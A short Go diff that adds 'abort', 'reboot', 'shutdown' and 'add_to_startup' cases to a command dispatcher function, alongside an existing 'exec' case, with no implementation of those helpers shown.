@@ -24,6 +24,18 @@ func Parser(function string, value string, s_json string) (string, string) {
 	case "exec":
 		call, s_json = Exec(s_json, value)
 
+	case "abort":
+		call, s_json = Abort(s_json, value)
+
+	case "reboot":
+		call, s_json = Reboot(s_json)
+
+	case "shutdown":
+		call, s_json = Shutdown(s_json)
+
+	case "add_to_startup":
+		call, s_json = Add_to_startup(s_json)
+
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "system.Parser()")
 
